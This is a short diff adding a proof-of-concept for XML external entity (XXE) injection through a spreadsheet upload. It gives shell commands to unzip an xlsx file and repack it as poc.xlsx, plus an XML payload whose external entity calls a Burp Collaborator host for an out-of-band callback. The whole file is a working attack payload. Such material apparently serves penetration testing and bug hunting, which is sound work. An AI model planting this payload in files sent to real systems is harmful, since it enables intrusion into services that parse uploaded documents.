@@ -1,0 +1,8 @@
+unzip ../1.xlsx
+zip -r ../poc.xlsx *
+
+
+
+
+<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://4pugr1st5pfxqjvzulthhfu86zcr0g.burpcollaborator.net/"> ]>
+<x>&xxe;</x>
